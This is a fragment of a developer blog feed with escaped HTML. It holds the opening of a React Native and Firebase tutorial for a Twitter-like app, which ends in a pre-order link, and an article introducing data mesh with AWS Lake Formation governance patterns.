      <description>&lt;p&gt;Using Social media is amazing, and if you are a developer, you might have thought about making your own social media. If the answer is yes then this blog is for you.&lt;/p&gt;

&lt;p&gt;There will be a lot of skills that you will learn after completing this, like, firebase, react native, custom hooks in react native, react navigation, react-native-pages, and much much more.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#table-of-content"&gt;
  &lt;/a&gt;
  &lt;strong&gt;Table of Content&lt;/strong&gt;
&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Introduction&lt;/li&gt;
&lt;li&gt;Create-React-App&lt;/li&gt;
&lt;li&gt;Installing Libraries&lt;/li&gt;
&lt;li&gt;Using react-navigation&lt;/li&gt;
&lt;li&gt;Adding fonts to our app&lt;/li&gt;
&lt;li&gt;Adding Firebase to our project&lt;/li&gt;
&lt;li&gt;Creating an onBoarding Screen&lt;/li&gt;
&lt;li&gt;Creating a Signup and Login Screen&lt;/li&gt;
&lt;li&gt;Create and Display tweets&lt;/li&gt;
&lt;li&gt;Profile Page with info&lt;/li&gt;
&lt;li&gt;Edit Profile&lt;/li&gt;
&lt;li&gt;Search Feature&lt;/li&gt;
&lt;li&gt;Conclusion&lt;/li&gt;
&lt;/ul&gt;

&lt;h3&gt;
  &lt;a href="#installing-libraries"&gt;
  &lt;/a&gt;
  &lt;strong&gt;Installing Libraries:&lt;/strong&gt;
&lt;/h3&gt;

&lt;p&gt;We will be needing some libraries/packages to complete this project, let's install it one by one. So first, what are those libraries:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;firebase &lt;/li&gt;
&lt;li&gt;react-navigation &lt;/li&gt;
&lt;li&gt;react-native-pages &lt;/li&gt;
&lt;li&gt;expo-font &lt;/li&gt;
&lt;li&gt;expo-app-loading &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;So lets then install it like:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;yarn add firebase @react-navigation/native @react-navigation/native-stack @react-navigation/bottom-tabs @react-navigation/drawer react-native-safe-area-context react-native-screens react-native-pages expo-font expo-app-loading&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;So these were the libraries we are going to install. You can use npm install instead of yarn add too.&lt;/p&gt;

&lt;p&gt;Using react-navigation&lt;br&gt;
React navigation is used to ( as you can see ) navigate between screens. Just like we do href in html. We will be adding Screens to react-navigation code when we make one. But first let's setup it:&lt;/p&gt;

&lt;p&gt;First let's import the stuff we need to:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;NavigationContainer&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;@react-navigation/native&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;createNativeStackNavigator&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;@react-navigation/native-stack&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;That's all the imports used to make a Stack Navigation. Now let's make it work:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="k"&gt;export&lt;/span&gt; &lt;span class="k"&gt;default&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;App&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;Stack&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;createNativeStackNavigator&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
   &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
      &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;NavigationContainer&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
        &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;Stack&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;Navigator&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
          &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;Stack&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;Screen&lt;/span&gt; &lt;span class="nx"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;Boarding&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt; &lt;span class="nx"&gt;component&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;BoardingScreen&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="sr"&gt;/&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;        &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/Stack.Navigator&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;      &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/NavigationContainer&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;   &lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;You will have to import the Boarding Screen to make it work. So if you run this app right now, it will cause an error. We will fix it later.&lt;/p&gt;

&lt;p&gt;That is all for this blog, if you want to create your fully function social media you can pre-order the book, right now, for only $3. &lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#pre-order-now"&gt;
  &lt;/a&gt;
  &lt;a href="https://thevik.gumroad.com/l/your-own-twitter"&gt;Pre Order Now&lt;/a&gt;
&lt;/h1&gt;

      <title>Introduction to Data Mesh</title>
      <author>Adit Modi</author>

      <guid>https://dev.to/aws-builders/introduction-to-data-mesh-3f1b</guid>
      <description>&lt;ul&gt;
&lt;li&gt;Organizations of all sizes have recognized that data is one of the key factors for increasing and sustaining innovation, and driving value for their customers and business units. &lt;/li&gt;
&lt;li&gt;They are modernizing traditional data platforms with cloud-native technologies that are highly scalable, feature-rich, and cost-effective. &lt;/li&gt;
&lt;li&gt;&lt;p&gt;As you look to make business decisions driven by data, you can be agile and productive by adopting a mindset that delivers data products from specialized teams, rather than through a centralized data management platform that provides generalized analytics.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;A centralized model simplifies staffing and training by centralizing data and technical expertise in a single place. This reduces technical debt since you are managing a single data platform, which reduces operational costs. Data platform groups, often part of central IT, are divided into teams based on the technical functions they support. &lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;For instance, one team might own the ingestion technologies used to collect data from numerous data sources managed by other teams and lines of business (LOBs). A different team might own the data pipelines, the writing and debugging extract, transform, and load (ETL) code, and orchestrating job runs, while validating and fixing data quality issues and ensuring that data processing meets business SLAs. &lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;However, managing data through a central data platform can create scaling, ownership, and accountability challenges. Central teams might not understand the specific needs of a data domain, due to data types and storage, security, data catalog requirements, or the specific technologies needed for data processing.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;You can often reduce these challenges by giving ownership and autonomy to the team who owns the data. This allows them to focus on building data products, rather than being limited to a common central data platform. &lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;For example, make product teams responsible for ensuring that the product inventory is updated regularly with new products and changes to existing ones. They’re the domain experts of the product inventory datasets, and if a discrepancy occurs, they’re the ones who know how to fix it. &lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Therefore, they’re best able to implement and operate a technical solution to ingest, process, and produce the product inventory dataset. They own everything leading up to the data being consumed: they choose the technology stack, operate in the mindset of data as a product, enforce security and auditing, and provide a mechanism to expose the data to the organization in an easy-to-consume way. &lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;This reduces overall friction for information flow in the organization, where the producer is responsible for the datasets they produce and is accountable to the consumer based on the advertised SLAs.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;This data-as-a-product paradigm is similar to the operating model that Amazon uses for building services. Service teams build their services, expose APIs with advertised SLAs, operate their services, and own the end-to-end customer experience. &lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;This is distinct from the model where one team builds the software, and a different team operates it. The end-to-end ownership model has allowed us to implement faster, with higher efficiency, and to quickly scale to meet customers’ use cases. &lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;We aren’t limited by centralized teams and their ability to scale to meet the demands of the business. Each service we build relies on other services that provide the building blocks. &lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;The analogy to this approach in the data world would be the data producers owning the end-to-end implementation and serving of data products, using the technologies they selected based on their unique needs. &lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--UJZqRPL5--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/lao5jezks12kf7hla1gg.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--UJZqRPL5--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/lao5jezks12kf7hla1gg.png" alt="Image description" width="880" height="495"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Building an Analytics Application on AWS&lt;/strong&gt; is a Series containing different articles that cover the key scenarios that are common in many analytics applications and how they influence the design and architecture of your analytics environment in AWS. These series present the assumptions made for each of these scenarios, the common drivers for the design, and a reference architecture for how these scenarios should be implemented.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;people have been talking about the data-driven organization model for years, which consists of data producers and consumers. This model is similar to those used by some of early adopting consumers and has been described by "Zhamak Dehghani of Thoughtworks", who coined the term data mesh.&lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#characteristics"&gt;
  &lt;/a&gt;
  Characteristics
&lt;/h1&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Data mesh is a pattern for defining how organizations can organize around data domains with a focus on delivering data as a product. However, it might not be the right pattern for every customer.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;A lake house approach and the data lake architecture provide technical guidance and solutions for building a modern data platform on AWS.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;The lake house approach with a foundational data lake serves as a repeatable blueprint for implementing data domains and products in a scalable way.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;The manner in which you use AWS analytics services in a data mesh pattern might change over time, but remains consistent with the technological recommendations and best practices for each service.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;The following are data mesh design goals:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;strong&gt;Data as a product&lt;/strong&gt; – Each organizational domain owns their data end to end. They’re responsible for building, operating, serving, and resolving any issues arising from the use of their data. Data accuracy and accountability lies with the data owner within the domain.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;Federated data governance&lt;/strong&gt; – Data governance helps ensure that data is secure, accurate, and not misused. The technical implementation of data governance, such as collecting lineage, validating data quality, encrypting data at rest and in transit, and enforcing appropriate access controls, can be managed by each of the data domains. However, central data discovery, reporting, and auditing is needed to make it easy for users to find data, and for auditors to verify compliance.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;Common access&lt;/strong&gt; – Data must be easily consumable by subject matter experts, such as data analysts and data scientists, and by purpose-built analytics and machine learning (ML) services, such as Amazon Athena, Amazon Redshift, and Amazon SageMaker. This requires data domains to expose a set of interfaces that make data consumable while enforcing appropriate access controls and audit tracking.&lt;/li&gt;
&lt;/ul&gt;


&lt;/li&gt;
&lt;li&gt;

&lt;p&gt;The following are user experience considerations:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Data teams own their information lifecycle, from the application that creates the original data, to the analytics systems that extract and create business reports and predictions. Through this lifecycle, they own the data model, and determine which datasets are suitable for publication to consumers.&lt;/li&gt;
&lt;li&gt;Data domain producers expose datasets to the rest of the organization by registering them with a central catalog. They can choose what to share, for how long, and how consumers can interact with them. They’re also responsible for maintaining the data and making sure it’s accurate and current.&lt;/li&gt;
&lt;li&gt;Data domain consumers and individual users should be given access to data through a supported interface, such as a data API, that helps ensure consistent performance, tracking, and access controls.&lt;/li&gt;
&lt;li&gt;All data assets are easily discoverable from a single central data catalog. The data catalog contains the datasets registered by data domain producers, including supporting metadata, such as lineage, data quality metrics, ownership information, and business context.&lt;/li&gt;
&lt;li&gt;All actions taken with data, usage patterns, data transformations, and data classifications should be accessible through a single, central place. Data owners, administrators, and auditors should be able to inspect an organization’s data compliance posture in a single place.&lt;/li&gt;
&lt;/ul&gt;


&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Let’s start with a high-level reference design that builds on top of the data mesh pattern. It further separates consumers, producers, and central governance to highlight the key aspects discussed previously. However, note that a data domain, in a data mesh pattern, might represent a data consumer, a data producer, or both.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;The AWS Lake House architecture relies on an AWS Glue and AWS Lake Formation Data Catalog for users to access the objects as tables. The users are entitled to these tables using Lake Formation, which is one per AWS account. &lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Each Lake Formation account has its own Data Catalog, but storing the metadata on the data objects on multiple accounts across various catalogs makes it hard for the consumers to select the table. &lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;A consumer has to log into individual accounts to see the objects, assuming that the consumer knows exactly where to look. A central catalog also makes it easy to feed into a central business catalog and allows easier auditing of grants or revokes (it just makes it easier; it does not provide a single store of audits). Therefore, a central Data Catalog is recommended.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;The metadata being on the central catalog does not make the tables in individual lakes accessible to all the consumers automatically. The actual entitlement on tables is individually granted and revoked by the application owner.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;This allowss the data mesh objective of the data strategy where the data is stored in multiple individually managed lakes, as opposed to a single central lake, while being accessible, provided properly entitled, to all the consumers. &lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;The role of the Data Catalog is of paramount importance here as the consumers can locate the proper storage of the data, they are interested in.&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class="table-wrapper-paragraph"&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Term&lt;/th&gt;
&lt;th&gt;Definition&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Data mesh&lt;/td&gt;
&lt;td&gt;Data is stored in multiple data stores, not in one single store. Consumers can access them as needed, assuming they are properly entitled.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;AWS Lake Formation&lt;/td&gt;
&lt;td&gt;A service that makes the data available as tables. Allows the owner of that table to give permissions to consumers.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;AWS Glue Data Catalog (Data Catalog)&lt;/td&gt;
&lt;td&gt;A data store containing metadata about the data, for example, table name, the columns in them, and user-defined tags. It does not contain actual data. This allows a consumer to know what to select.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Amazon Athena&lt;/td&gt;
&lt;td&gt;A managed service that allows a user to enter a SQL query to select data. It in turn fetches the data and presents it in a tabular format. Athena needs a Data Catalog to let the consumer know the columns to select.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Resource link&lt;/td&gt;
&lt;td&gt;A link that extends from one catalog to another and allows the consumers in the remote catalog to view and query the tables in the remote database as if the tables were in their local database. There are two types of resource links: for a specific table, and for an entire database.&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;&lt;/div&gt;

&lt;h1&gt;
  &lt;a href="#reference-architecture"&gt;
  &lt;/a&gt;
  Reference architecture
&lt;/h1&gt;

&lt;ul&gt;
&lt;li&gt;Here is a pattern for a single producer account, a single consumer account, and a central Lake Formation account. Each account has an AWS Glue Data Catalog. &lt;/li&gt;
&lt;li&gt;The central account's Data Catalog is considered the main catalog. Resource links are established to the producer and consumer accounts. &lt;/li&gt;
&lt;li&gt;&lt;p&gt;This way, when the central account changes something, both accounts get the schema updates. The consumers selecting data will always see the most recent metadata.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;The producer account always has the authority to grant or revoke the permissions on the tables in its Data Catalog. The central Lake Formation account is merely a holder of metadata, which sends it to all the consumer accounts which has a subscription via a resource link. Under no circumstances the central Lake Formation account can grant on its own.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;With the concept in place, let’s look at three design patterns for deploying a data mesh architecture.&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--hWRN-mn1--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/h336eb7blyqv25ixxjqx.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--hWRN-mn1--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/h336eb7blyqv25ixxjqx.png" alt="Image description" width="800" height="459"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Data mesh reference architecture&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
&lt;li&gt;Workflow from producer to consumer:&lt;/li&gt;
&lt;/ul&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;Data source locations hosted by the producer are created within the producer’s AWS Glue Data Catalog and registered with Lake Formation.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;When a dataset is presented as a product, producers create Lake Formation Data Catalog entities (database, table, columns, attributes) within the central governance account. This makes it easy to find and discover catalogs across consumers. However, this doesn’t grant any permission rights to catalogs or data to all accounts or consumers, and all grants are be authorized by the producer.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;The central Lake Formation Data Catalog shares the Data Catalog resources back to the producer account with required permissions via Lake Formation resource links to metadata databases and tables.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Lake Formation permissions are granted in the central account to producer role personas (such as the data engineer role) to manage schema changes and perform data transformations (alter, delete, update) on the central Data Catalog.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Producers accept the resource share from the central governance account so they can make changes to the schema at a later time.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Data changes made within the producer account are automatically propagated into the central governance copy of the catalog.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Based on a consumer access request, and the need to make data visible in the consumer’s AWS Glue Data Catalog, the central account owner grants Lake Formation permissions to a consumer account based on direct entity sharing, or based on tag-based access controls, which can be used to administer access via controls like data classification, cost center, or environment.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Lake Formation in the consumer account can define access permissions on these datasets for local users to consume. Users in the consumer account, like data analysts and data scientists, can query data using their chosen tool such as Athena and Amazon Redshift.&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;In some cases, multiple catalogs are necessary and there is no other alternative. For example, if data is sent to both Regions, there will be two Data Catalogs that need to be maintained.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Option 1: Central data governance model&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Here is a more practical model with multiple producers and consumers accounts. There is still a single central data governance account, which has resource links to all the other accounts. Note that we didn't deliberately name them with specific lines of business (LOBs), since this model applies to any LOB and any number of lakes. &lt;/p&gt;

&lt;p&gt;&lt;em&gt;Roles of various accounts&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Here are the roles of the various types of accounts.&lt;/p&gt;

&lt;div class="table-wrapper-paragraph"&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Account&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Producer account&lt;/td&gt;
&lt;td&gt;* Allows data producers to write data into their respective S3 buckets.* Does not allow interactive access to S3 buckets or objects in them.* Allows only production ETL jobs to perform transformation, movement, etc.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Consumer account&lt;/td&gt;
&lt;td&gt;* Allows data consumption through Athena, Redshift Spectrum, and web apps.* Only cataloged items can be queried, not all objects in the bucket.* Isolates the data changes (done by producer account) from data access (consumer accounts).&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Central account&lt;/td&gt;
&lt;td&gt;* This is a central catalog of all metadata. If additional consumer accounts are created, the metadata is replicated from this central account.* Since all metadata is in one place, it allows easier auditing of actions like grants and revokes on tables. The actual auditing is still decentralized but a central account makes the reporting easier.* Consumer accounts need to access the metadata using resource links to this central catalog only.* Does not contain any actual data. Only logs are stored here.&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;&lt;/div&gt;

&lt;p&gt;&lt;em&gt;Notes&lt;/em&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;These are just roles and they are not mutually exclusive. It's possible to have one AWS account with both roles of producer and consumer. A batch serving account is such an example.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;These accounts are Region-specific and are all in the same Region. They are not across Regions.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;These accounts interact as shown in the following diagrams.&lt;/li&gt;
&lt;/ul&gt;


&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--pIzVdtqe--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/e7uva0hl8xtb680wijm0.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--pIzVdtqe--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/e7uva0hl8xtb680wijm0.png" alt="Image description" width="800" height="440"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Central data governance model&lt;/em&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;The producers can onboard their dataset table names, but the tables are completely independent and federated in central data governance account.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;em&gt;Advantages&lt;/em&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;All datasets are available in one place for querying.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Entitlements become easier.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;A single database to database resource link is enough (assuming database-to-database resource links are allowed).&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Single source of data truth – one-way sharing of catalog across various organizations.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;The LOBs still have the choice to define metadata, schema evolution and manage permissions. The central Lake Formation account does not enforce anything on them.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Allows centralized auditing.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Allows local sandbox accounts for consumers, which is useful in cases such as model training and serving.&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;em&gt;Disadvantages&lt;/em&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;More complex for consumer analysts than using one data warehouse.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Required skills are more aligned to security and governance than analytics.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Technology solution – may not solve issues created by misaligned LOBs incentives.&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Option 2: Federated Line of Business (LOB) central governance model&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;In this model, each LOB maintains an independent central Lake Formation account, which eases the use of centralized auditing in that LOB. Consumer accounts can see the data from producer accounts in the same LOB only. For accessing the data across LOBs, they need to establish the resource links to the appropriate catalog.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--ghXUz_x6--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/laiocn1pyjjh0zcf15t3.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--ghXUz_x6--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/laiocn1pyjjh0zcf15t3.png" alt="Image description" width="800" height="498"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Federated LOB central governance model&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Advantages&lt;/em&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Each LOB still maintains their own Lake Formation central account and access control.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;The blast radius in case of non–availability of a single Lake Formation account is reduced.&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;em&gt;Disadvantages&lt;/em&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Centralized metadata is impossible since there is no central account. Audits from each central account need to be pulled and consolidated.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Resource links need to be created across multiple catalogs. This makes it difficult to maintain the links, especially as the number of lakes grows.&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Option 3: Completely federated data governance model&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;In this model, there is no central Lake Formation. Each producer account maintains their own Data Catalog and each consumer accesses the Data Catalog via a resource link.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--jUNAHs-U--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/v8e0gtq78108g3sud3ak.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--jUNAHs-U--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/v8e0gtq78108g3sud3ak.png" alt="Image description" width="800" height="459"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Completely federated data governance model&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Advantages&lt;/em&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;There is complete separation among the Lake Formation accounts.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Local queries go to the local Lake Formation Data Catalog. They don't need the trip to the central Lake Formation.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Any operator error that deletes a single Lake Formation account will not affect anything else, even inside the same LOB.&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;em&gt;Disadvantages&lt;/em&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Entitlements will need to be distributed.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Multiple resource links need to be created and maintained, which quickly becomes a burden in the data organization scale.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;When data from a central business catalog is replicated over to the other Lake Formation catalogs, all those Lake Formation catalogs need to be updated individually.&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

      <title>what algorithm do you use to store your passwords?</title>
